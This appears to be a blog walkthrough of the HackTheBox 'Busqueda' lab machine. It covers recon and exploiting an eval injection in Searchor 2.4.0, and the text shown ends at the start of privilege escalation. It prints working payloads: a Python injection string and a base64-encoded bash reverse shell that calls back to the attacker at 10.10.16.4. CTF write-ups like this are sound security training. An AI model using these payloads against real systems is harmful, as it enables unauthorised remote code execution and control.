
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Busqueda - HTB</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css" rel="stylesheet">
    <link href="/css/articles.css" rel="stylesheet">
    <link href="/css/styles.css" rel="stylesheet">
    <link href="/css/monokai.css" rel="stylesheet">
    <link href="/css/writeups.css" rel="stylesheet">
    <link rel="icon" href="/favicon.ico" type="image/x-icon">
</head>
<body>
    <button class="sidebar-toggle" id="sidebarToggle">â˜°</button>
    <div class="container-fluid">
        <div class="row">
            <!-- Sidebar -->
            <aside class="sidebar">
                <div class="sidebar-logo">
                    <img src="/img/new-logo.png" alt="Logo">
                    <h3>elswix</h3>
                </div>
                <nav>
                    <ul class="nav flex-column">
                        <li class="nav-item"><a href="/" class="nav-link active"><i class="bi bi-house-door"></i> Home</a></li>
                        <li class="nav-item"><a href="/articles" class="nav-link"><i class="bi bi-card-text"></i> Articles</a></li>
                        <li class="nav-item"><a href="/writeups" class="nav-link"><i class="bi bi-terminal"></i> WriteUPs</a></li>
                        <li class="nav-item"><a href="/notes" class="nav-link"><i class="bi bi-journal-text"></i> Notes</a></li>
                        <li class="nav-item"><a href="https://github.com/elswix/KL-Sunset" target="_blank" class="nav-link"><i class="bi bi-github"></i> KL-Sunset</a></li>
                        <li class="nav-item"><a href="/about" class="nav-link"><i class="bi bi-person"></i> About me</a></li>
                    </ul>
                </nav>
            </aside>
            <!-- Main Content -->
            <main>
                <!-- Hero Section -->
                <section class="hero mb-5">
                    <img alt="index-logo" class="mb-3" style="width: 120px; height: 120px; border-radius: 50%" src="/writeups/htb/easy/busqueda/img/busqueda.png">
                <h2>Busqueda - HTB</h2>
                <p>walkthrough by elswix<p>
                <ul class="machine-links" style="display: none">
                    <li><a href="https://app.hackthebox.com/machines/Busqueda">HackTheBox</a></li>
                </ul>
            </section>
                <section class="article-content">
                    <div class="article-container">
                        <div class="article-content-main">                <div class="highlight"><pre><span></span><span class="k">Machine</span><span class="p">:</span> <span class="n">Busqueda</span>
<span class="k">Difficulty</span><span class="p">:</span> <span class="n">Easy</span>
<span class="k">Platform</span><span class="p">:</span> <span class="n">HackTheBox</span>
<span class="k">Release</span><span class="p">:</span> <span class="n">Released</span> <span class="n">on</span> <span class="mi">04</span><span class="o">/</span><span class="mi">08</span><span class="o">/</span><span class="mi">2023</span>
</pre></div>

Busqueda is a platform that provides a website offering links to various web pages based on user input. Behind the scenes, it utilizes the Python Searchor command line tool. In this scenario, I identify an unsafe eval vulnerability and exploit it to gain code execution privileges. On the host system, users have the option to execute a Python script using sudo, but the script's content remains hidden. My approach involves discovering a virtual host associated with Gitea and leveraging this discovery, in conjunction with different login credentials, to eventually locate the source code of the script. This enables me to determine how to execute it in a way that grants arbitrary root-level access.<br/><br/>
<hr/>
<h3><br>Recon:</br></h3><br>
As always, we must ascertain the open ports on the target machine, as it is through these ports that it exposes its services.<br/><br/>
Now, using nmap: <br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@parrot</span><span class="err">$</span> <span class="n">sudo</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">p</span><span class="o">-</span> <span class="o">--</span><span class="nb">open</span> <span class="o">-</span><span class="n">sS</span> <span class="o">--</span><span class="nb">min</span><span class="o">-</span><span class="n">rate</span> <span class="mi">5000</span> <span class="o">-</span><span class="n">v</span> <span class="o">-</span><span class="n">n</span> <span class="o">-</span><span class="n">Pn</span> <span class="mf">10.10.11.208</span> <span class="o">-</span><span class="n">oN</span> <span class="n">portScan</span>

<span class="n">Host</span> <span class="n">discovery</span> <span class="n">disabled</span> <span class="p">(</span><span class="o">-</span><span class="n">Pn</span><span class="p">)</span><span class="o">.</span> <span class="n">All</span> <span class="n">addresses</span> <span class="n">will</span> <span class="n">be</span> <span class="n">marked</span> <span class="s1">'up'</span> <span class="ow">and</span> <span class="n">scan</span> <span class="n">times</span> <span class="n">may</span> <span class="n">be</span> <span class="n">slower</span><span class="o">.</span>
<span class="n">Starting</span> <span class="n">Nmap</span> <span class="mf">7.93</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2023</span><span class="o">-</span><span class="mi">06</span><span class="o">-</span><span class="mi">24</span> <span class="mi">15</span><span class="p">:</span><span class="mi">35</span> <span class="n">EDT</span>
<span class="n">Initiating</span> <span class="n">SYN</span> <span class="n">Stealth</span> <span class="n">Scan</span> <span class="n">at</span> <span class="mi">15</span><span class="p">:</span><span class="mi">35</span>
<span class="n">Scanning</span> <span class="mf">10.10.11.208</span> <span class="p">[</span><span class="mi">65535</span> <span class="n">ports</span><span class="p">]</span>
<span class="n">Discovered</span> <span class="nb">open</span> <span class="n">port</span> <span class="mi">22</span><span class="o">/</span><span class="n">tcp</span> <span class="n">on</span> <span class="mf">10.10.11.208</span>
<span class="n">Discovered</span> <span class="nb">open</span> <span class="n">port</span> <span class="mi">80</span><span class="o">/</span><span class="n">tcp</span> <span class="n">on</span> <span class="mf">10.10.11.208</span>
<span class="n">Completed</span> <span class="n">SYN</span> <span class="n">Stealth</span> <span class="n">Scan</span> <span class="n">at</span> <span class="mi">15</span><span class="p">:</span><span class="mi">36</span><span class="p">,</span> <span class="mf">15.39</span><span class="n">s</span> <span class="n">elapsed</span> <span class="p">(</span><span class="mi">65535</span> <span class="n">total</span> <span class="n">ports</span><span class="p">)</span>
<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.10.11.208</span>
<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span><span class="p">,</span> <span class="n">received</span> <span class="n">user</span><span class="o">-</span><span class="nb">set</span> <span class="p">(</span><span class="mf">0.15</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
<span class="n">Scanned</span> <span class="n">at</span> <span class="mi">2023</span><span class="o">-</span><span class="mi">06</span><span class="o">-</span><span class="mi">24</span> <span class="mi">15</span><span class="p">:</span><span class="mi">35</span><span class="p">:</span><span class="mi">49</span> <span class="n">EDT</span> <span class="k">for</span> <span class="mi">15</span><span class="n">s</span>
<span class="n">Not</span> <span class="n">shown</span><span class="p">:</span> <span class="mi">65533</span> <span class="n">closed</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">reset</span><span class="p">)</span>
<span class="n">PORT</span>   <span class="n">STATE</span> <span class="n">SERVICE</span> <span class="n">REASON</span>
<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">ssh</span>     <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">63</span>
<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">http</span>    <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">63</span>

<span class="n">Read</span> <span class="n">data</span> <span class="n">files</span> <span class="n">from</span><span class="p">:</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/../</span><span class="n">share</span><span class="o">/</span><span class="n">nmap</span>
<span class="n">Nmap</span> <span class="n">done</span><span class="p">:</span> <span class="mi">1</span> <span class="n">IP</span> <span class="n">address</span> <span class="p">(</span><span class="mi">1</span> <span class="n">host</span> <span class="n">up</span><span class="p">)</span> <span class="n">scanned</span> <span class="ow">in</span> <span class="mf">15.54</span> <span class="n">seconds</span>
           <span class="n">Raw</span> <span class="n">packets</span> <span class="n">sent</span><span class="p">:</span> <span class="mi">75492</span> <span class="p">(</span><span class="mf">3.322</span><span class="n">MB</span><span class="p">)</span> <span class="o">|</span> <span class="n">Rcvd</span><span class="p">:</span> <span class="mi">75471</span> <span class="p">(</span><span class="mf">3.019</span><span class="n">MB</span><span class="p">)</span>
</pre></div>

We can observe that there are two open ports. One of these ports is 22, corresponding to the SSH service. The other port we've identified is port 80, which belongs to the HTTP service, namely, a web service.<br/><br/>
Since we lack valid credentials, we cannot exploit port 22 to gain access to the system; therefore, it appears that we should commence with port 80.<br/><br/>
If you do not recognize any of these ports, you may employ the nmap tool once more to conduct a comprehensive scan to identify the services and versions running on those ports.<br/><br/>
<div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="o">-</span><span class="n">sCV</span> <span class="o">-</span><span class="n">p80</span><span class="p">,</span><span class="mi">22</span> <span class="mf">10.10.11.208</span> <span class="o">-</span><span class="n">oN</span> <span class="n">fullScan</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="nd">elswix@parrot</span><span class="err">$</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">sCV</span> <span class="o">-</span><span class="n">p80</span><span class="p">,</span><span class="mi">22</span> <span class="mf">10.10.11.208</span> <span class="o">-</span><span class="n">oN</span> <span class="n">fullScan</span>
<span class="n">Starting</span> <span class="n">Nmap</span> <span class="mf">7.93</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2023</span><span class="o">-</span><span class="mi">06</span><span class="o">-</span><span class="mi">24</span> <span class="mi">15</span><span class="p">:</span><span class="mi">45</span> <span class="n">EDT</span>
<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.10.11.208</span> <span class="p">(</span><span class="mf">10.10.11.208</span><span class="p">)</span>
<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.19</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>

<span class="n">PORT</span>   <span class="n">STATE</span> <span class="n">SERVICE</span> <span class="n">VERSION</span>
<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">ssh</span>     <span class="n">OpenSSH</span> <span class="mf">8.9</span><span class="n">p1</span> <span class="n">Ubuntu</span> <span class="mi">3</span><span class="n">ubuntu0</span><span class="mf">.1</span> <span class="p">(</span><span class="n">Ubuntu</span> <span class="n">Linux</span><span class="p">;</span> <span class="n">protocol</span> <span class="mf">2.0</span><span class="p">)</span>
<span class="o">|</span> <span class="n">ssh</span><span class="o">-</span><span class="n">hostkey</span><span class="p">:</span> 
<span class="o">|</span>   <span class="mi">256</span> <span class="mi">4</span><span class="n">fe3a667a227f9118dc30ed773a02c28</span> <span class="p">(</span><span class="n">ECDSA</span><span class="p">)</span>
<span class="o">|</span><span class="n">_</span>  <span class="mi">256</span> <span class="mf">816e78766</span><span class="n">b8aea7d1babd436b7f8ecc4</span> <span class="p">(</span><span class="n">ED25519</span><span class="p">)</span>
<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">http</span>    <span class="n">Apache</span> <span class="n">httpd</span> <span class="mf">2.4.52</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span> <span class="n">Apache</span><span class="o">/</span><span class="mf">2.4.52</span> <span class="p">(</span><span class="n">Ubuntu</span><span class="p">)</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span> <span class="n">Did</span> <span class="ow">not</span> <span class="n">follow</span> <span class="n">redirect</span> <span class="n">to</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">searcher</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span>
<span class="n">Service</span> <span class="n">Info</span><span class="p">:</span> <span class="n">Host</span><span class="p">:</span> <span class="n">searcher</span><span class="o">.</span><span class="n">htb</span><span class="p">;</span> <span class="n">OS</span><span class="p">:</span> <span class="n">Linux</span><span class="p">;</span> <span class="n">CPE</span><span class="p">:</span> <span class="n">cpe</span><span class="p">:</span><span class="o">/</span><span class="n">o</span><span class="p">:</span><span class="n">linux</span><span class="p">:</span><span class="n">linux_kernel</span>

<span class="n">Service</span> <span class="n">detection</span> <span class="n">performed</span><span class="o">.</span> <span class="n">Please</span> <span class="n">report</span> <span class="nb">any</span> <span class="n">incorrect</span> <span class="n">results</span> <span class="n">at</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span> <span class="o">.</span>
<span class="n">Nmap</span> <span class="n">done</span><span class="p">:</span> <span class="mi">1</span> <span class="n">IP</span> <span class="n">address</span> <span class="p">(</span><span class="mi">1</span> <span class="n">host</span> <span class="n">up</span><span class="p">)</span> <span class="n">scanned</span> <span class="ow">in</span> <span class="mf">18.36</span> <span class="n">seconds</span>
</pre></div>

Before proceeding with the scan results, we can observe that when accessing the website via the IP address, it redirects us to a domain that doesn't resolve. Therefore, we need to add it to the /etc/hosts file.<br/><br/>
<div class="highlight"><pre><span></span><span class="c1"># Host addresses</span>
<span class="mf">127.0.0.1</span>  <span class="n">localhost</span>
<span class="mf">127.0.1.1</span>  <span class="n">Parrot</span>
<span class="p">::</span><span class="mi">1</span>        <span class="n">localhost</span> <span class="n">ip6</span><span class="o">-</span><span class="n">localhost</span> <span class="n">ip6</span><span class="o">-</span><span class="n">loopback</span>
<span class="n">ff02</span><span class="p">::</span><span class="mi">1</span>    <span class="n">ip6</span><span class="o">-</span><span class="n">allnodes</span>
<span class="n">ff02</span><span class="p">::</span><span class="mi">2</span>    <span class="n">ip6</span><span class="o">-</span><span class="n">allrouters</span>

<span class="c1"># HackTheBox</span>
<span class="mf">10.10.11.208</span> <span class="n">searcher</span><span class="o">.</span><span class="n">htb</span>
</pre></div>

Typically, before accessing the browser, I like to analyze the technologies and resources of web services through the console. To do this, we will use the "whatweb" tool:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@parrot</span><span class="err">$</span> <span class="n">whatweb</span> <span class="o">-</span><span class="n">a</span> <span class="mi">3</span> <span class="mf">10.10.11.208</span>
<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.11.208</span> <span class="p">[</span><span class="mi">302</span> <span class="n">Found</span><span class="p">]</span> <span class="n">Apache</span><span class="p">[</span><span class="mf">2.4.52</span><span class="p">],</span> <span class="n">Country</span><span class="p">[</span><span class="n">RESERVED</span><span class="p">][</span><span class="n">ZZ</span><span class="p">],</span> <span class="n">HTTPServer</span><span class="p">[</span><span class="n">Ubuntu</span> <span class="n">Linux</span><span class="p">][</span><span class="n">Apache</span><span class="o">/</span><span class="mf">2.4.52</span> <span class="p">(</span><span class="n">Ubuntu</span><span class="p">)],</span> <span class="n">IP</span><span class="p">[</span><span class="mf">10.10.11.208</span><span class="p">],</span> <span class="n">RedirectLocation</span><span class="p">[</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">searcher</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="p">],</span> <span class="n">Title</span><span class="p">[</span><span class="mi">302</span> <span class="n">Found</span><span class="p">]</span>

<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">searcher</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span> <span class="p">[</span><span class="mi">200</span> <span class="n">OK</span><span class="p">]</span> <span class="n">Bootstrap</span><span class="p">[</span><span class="mf">4.1.3</span><span class="p">],</span> <span class="n">Country</span><span class="p">[</span><span class="n">RESERVED</span><span class="p">][</span><span class="n">ZZ</span><span class="p">],</span> <span class="n">HTML5</span><span class="p">,</span> <span class="n">HTTPServer</span><span class="p">[</span><span class="n">Werkzeug</span><span class="o">/</span><span class="mf">2.1.2</span> <span class="n">Python</span><span class="o">/</span><span class="mf">3.10.6</span><span class="p">],</span> <span class="n">IP</span><span class="p">[</span><span class="mf">10.10.11.208</span><span class="p">],</span> <span class="n">JQuery</span><span class="p">[</span><span class="mf">3.2.1</span><span class="p">],</span> <span class="n">Python</span><span class="p">[</span><span class="mf">3.10.6</span><span class="p">],</span> <span class="n">Script</span><span class="p">,</span> <span class="n">Title</span><span class="p">[</span><span class="n">Searcher</span><span class="p">],</span> <span class="n">Werkzeug</span><span class="p">[</span><span class="mf">2.1.2</span><span class="p">]</span>
</pre></div>

Thanks to adding the domain to the /etc/hosts file, we are now redirected to the domain pointing to the machine's IP address.<br/><br/>
Upon analyzing the website, we can see that it utilizes Python, Werkzeug, and JQuery. It appears that the website is hosted in a Flask environment.<br/><br/>
<h3><br>Web Application</br></h3><br>
Once in the browser, we can access the web page with a graphical interface:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/easy/busqueda/img/1.png"/><br/><br/>
Using the <a href="https://addons.mozilla.org/es/firefox/addon/wappalyzer/">Wappalyzer</a> extension, we can identify the technologies employed by this website:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/easy/busqueda/img/2.png"/><br/><br/>
Scrolling down on the webpage, we can observe the presence of a field that allows us to input data. This field allows us to specify a search engine and the data we wish to search for:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/easy/busqueda/img/4.png"/><br/><br/>
In the footer of the webpage, we can observe the technologies used by the web service, and one of them is <a href="https://github.com/ArjunSharda/Searchor/tree/v2.4.0">Searchor v2.4.0</a>:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/easy/busqueda/img/5.png"/><br/><br/>
If we search for vulnerabilities associated with this version of the Searchor package, we find that versions prior to 2.4.2 are susceptible to command injection.<br/><br/>
Analyzing the source code of version <a href="https://github.com/ArjunSharda/Searchor/tree/v2.4.0">2.4.0</a>, we can see that in the file <a href="https://raw.githubusercontent.com/ArjunSharda/Searchor/v2.4.0/src/searchor/main.py">app.py</a>, the following lines of code are causing the vulnerability:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/easy/busqueda/img/6.png"/><br/><br/>
The issue here lies in the use of the Python <code>eval</code> function, which allows for the interpretation of arbitrary Python expressions from input based on strings or compiled code.<br/><br/>
<h3><br>Shell as svc</br></h3><br>
At this point, I attempted to perform a search on the main page using the Google search engine, intercepting all requests with Burp Suite.<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/easy/busqueda/img/7.png"/><br/><br/>
If we examine the source code, we can observe that the "query" parameter corresponds to the variable referenced in the vulnerable line of code.<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/easy/busqueda/img/6.png"/><br/><br/>
After conducting some tests, we were able to make the data we sent through the "query" parameter execute Python code that we specify. Below is the payload for testing remote command execution by sending an ICMP trace:<br/><br/>
<div class="highlight"><pre><span></span>test'),__import__('os').system('ping -c 1 10.10.16.4')#
</pre></div>

Before sending it, we need to listen using the tcpdump tool to capture ICMP traces:<br/><br/>
<div class="highlight"><pre><span></span><span class="n">tcpdump</span> <span class="o">-</span><span class="n">i</span> <span class="n">tun0</span> <span class="n">icmp</span> <span class="o">-</span><span class="n">n</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="nd">root@parrot</span><span class="err">$</span> <span class="n">tcpdump</span> <span class="o">-</span><span class="n">i</span> <span class="n">tun0</span> <span class="n">icmp</span> <span class="o">-</span><span class="n">n</span>
<span class="n">tcpdump</span><span class="p">:</span> <span class="n">verbose</span> <span class="n">output</span> <span class="n">suppressed</span><span class="p">,</span> <span class="n">use</span> <span class="o">-</span><span class="n">v</span><span class="p">[</span><span class="n">v</span><span class="p">]</span><span class="o">...</span> <span class="k">for</span> <span class="n">full</span> <span class="n">protocol</span> <span class="n">decode</span>
<span class="n">listening</span> <span class="n">on</span> <span class="n">tun0</span><span class="p">,</span> <span class="n">link</span><span class="o">-</span><span class="nb">type</span> <span class="n">RAW</span> <span class="p">(</span><span class="n">Raw</span> <span class="n">IP</span><span class="p">),</span> <span class="n">snapshot</span> <span class="n">length</span> <span class="mi">262144</span> <span class="nb">bytes</span>
</pre></div>

We send the payload: <br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/easy/busqueda/img/8.png"/><br/><br/>
We have received the ping:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/easy/busqueda/img/10.png"/><br/><br/>
The idea now is to send a reverse shell to obtain an interactive remote console with which to operate.<br/><br/>
To avoid issues with single and double quotes, I will opt to use base64 encoding to encode, decode, and interpret the command that will send us the reverse shell. To do this, we will start by base64 encoding the typical Bash one-liner that will establish a reverse shell over port 443 using the TCP protocol:<br/><br/>
<div class="highlight"><pre><span></span><span class="n">echo</span> <span class="o">-</span><span class="n">n</span> <span class="s1">'bash -c "bash -i &gt;&amp; /dev/tcp/10.10.16.4/443 0&gt;&amp;1"'</span> <span class="o">|</span> <span class="n">base64</span> <span class="o">-</span><span class="n">w</span> <span class="mi">0</span><span class="p">;</span> <span class="n">echo</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="nd">elswix@parrot</span><span class="err">$</span> <span class="n">echo</span> <span class="o">-</span><span class="n">n</span> <span class="s1">'bash -c "bash -i &gt;&amp; /dev/tcp/10.10.16.4/443 0&gt;&amp;1"'</span> <span class="o">|</span> <span class="n">base64</span> <span class="o">-</span><span class="n">w</span> <span class="mi">0</span><span class="p">;</span> <span class="n">echo</span>
<span class="n">YmFzaCAtYyAiYmFzaCAtaSA</span><span class="o">+</span><span class="n">JiAvZGV2L3RjcC8xMC4xMC4xNi40LzQ0MyAwPiYxIg</span><span class="o">==</span>
</pre></div>

Before sending the payload, we set up a listener on port 443 using the Ncat tool:<br/><br/>
<div class="highlight"><pre><span></span><span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">443</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="nd">root@parrot</span><span class="err">$$</span> <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">443</span> 
<span class="n">Ncat</span><span class="p">:</span> <span class="n">Version</span> <span class="mf">7.93</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">ncat</span> <span class="p">)</span>
<span class="n">Ncat</span><span class="p">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="p">:::</span><span class="mi">443</span>
<span class="n">Ncat</span><span class="p">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">443</span>
</pre></div>

We send the following payload: <br/><br/>
<div class="highlight"><pre><span></span>test'),__import__('os').system('echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi40LzQ0MyAwPiYxIg== | base64 -d | bash')#
</pre></div>
<img alt="" src="https://elswix.github.io/writeups/htb/easy/busqueda/img/11.png"/><br/><br/>
<div class="highlight"><pre><span></span><span class="nd">root@parrot</span><span class="err">$</span> <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">443</span>
<span class="n">Ncat</span><span class="p">:</span> <span class="n">Version</span> <span class="mf">7.93</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">ncat</span> <span class="p">)</span>
<span class="n">Ncat</span><span class="p">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="p">:::</span><span class="mi">443</span>
<span class="n">Ncat</span><span class="p">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">443</span>
<span class="n">Ncat</span><span class="p">:</span> <span class="n">Connection</span> <span class="kn">from</span> <span class="mf">10.10.11.208</span><span class="o">.</span>
<span class="n">Ncat</span><span class="p">:</span> <span class="n">Connection</span> <span class="kn">from</span> <span class="mf">10.10.11.208</span><span class="p">:</span><span class="mf">36890.</span>
<span class="n">bash</span><span class="p">:</span> <span class="n">cannot</span> <span class="nb">set</span> <span class="n">terminal</span> <span class="n">process</span> <span class="n">group</span> <span class="p">(</span><span class="mi">1681</span><span class="p">):</span> <span class="n">Inappropriate</span> <span class="n">ioctl</span> <span class="k">for</span> <span class="n">device</span>
<span class="n">bash</span><span class="p">:</span> <span class="n">no</span> <span class="n">job</span> <span class="n">control</span> <span class="ow">in</span> <span class="n">this</span> <span class="n">shell</span>
<span class="nd">svc@busqueda</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">app</span><span class="err">$</span>
</pre></div>

Excellent, we have obtained a reverse shell.<br/><br/>
We could use this same shell we have obtained, but personally, I prefer to use a much more interactive shell to take advantage of keyboard shortcuts and other features.<br/><br/>
To achieve this, we execute the following:<br/><br/>
<div class="highlight"><pre><span></span><span class="n">script</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span> <span class="o">-</span><span class="n">c</span> <span class="n">bash</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="nd">svc@busqueda</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">app</span><span class="err">$</span> <span class="n">script</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span> <span class="o">-</span><span class="n">c</span> <span class="n">bash</span>
</pre></div>

We press <code>Ctrl+Z</code> and then execute:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">root@parrot</span><span class="err">$$</span> <span class="n">stty</span> <span class="n">raw</span> <span class="o">-</span><span class="n">echo</span><span class="p">;</span><span class="n">fg</span>
</pre></div>

We press <code>Enter</code> and execute:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">svc@busqueda</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">app</span><span class="err">$</span> <span class="n">reset</span> <span class="n">xterm</span>
</pre></div>

Now, finally, we just need to export certain environment variables to be more comfortable in the console:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">svc@busqueda</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">app</span><span class="err">$</span> <span class="n">export</span> <span class="n">TERM</span><span class="o">=</span><span class="n">xterm</span>
<span class="nd">svc@busqueda</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">app</span><span class="err">$</span> <span class="n">export</span> <span class="n">SHELL</span><span class="o">=/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
<span class="nd">svc@busqueda</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">app</span><span class="err">$</span> <span class="n">stty</span> <span class="n">rows</span> <span class="mi">51</span> <span class="n">columns</span> <span class="mi">189</span>
</pre></div>
<h3><br>Privilege Escalation -&gt; ROOT #</br></h3><br>
Enumerating the resources of the web service, we can see the presence of the ".git" directory of the repository.<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">svc@busqueda</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">app</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">la</span>
<span class="n">total</span> <span class="mi">20</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">4</span> <span class="n">www</span><span class="o">-</span><span class="n">data</span> <span class="n">www</span><span class="o">-</span><span class="n">data</span> <span class="mi">4096</span> <span class="n">Apr</span>  <span class="mi">3</span> <span class="mi">14</span><span class="p">:</span><span class="mi">32</span> <span class="o">.</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">4</span> <span class="n">root</span>     <span class="n">root</span>     <span class="mi">4096</span> <span class="n">Apr</span>  <span class="mi">4</span> <span class="mi">16</span><span class="p">:</span><span class="mi">02</span> <span class="o">..</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">www</span><span class="o">-</span><span class="n">data</span> <span class="n">www</span><span class="o">-</span><span class="n">data</span> <span class="mi">1124</span> <span class="n">Dec</span>  <span class="mi">1</span>  <span class="mi">2022</span> <span class="n">app</span><span class="o">.</span><span class="n">py</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">8</span> <span class="n">www</span><span class="o">-</span><span class="n">data</span> <span class="n">www</span><span class="o">-</span><span class="n">data</span> <span class="mi">4096</span> <span class="n">Jun</span> <span class="mi">24</span> <span class="mi">19</span><span class="p">:</span><span class="mi">33</span> <span class="o">.</span><span class="n">git</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">2</span> <span class="n">www</span><span class="o">-</span><span class="n">data</span> <span class="n">www</span><span class="o">-</span><span class="n">data</span> <span class="mi">4096</span> <span class="n">Dec</span>  <span class="mi">1</span>  <span class="mi">2022</span> <span class="n">templates</span>
<span class="nd">svc@busqueda</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">app</span><span class="err">$</span>
</pre></div>

We enter the directory and observe that there is a file named <code>config</code>:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">svc@busqueda</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">app</span><span class="err">$</span> <span class="n">cd</span> <span class="o">.</span><span class="n">git</span>
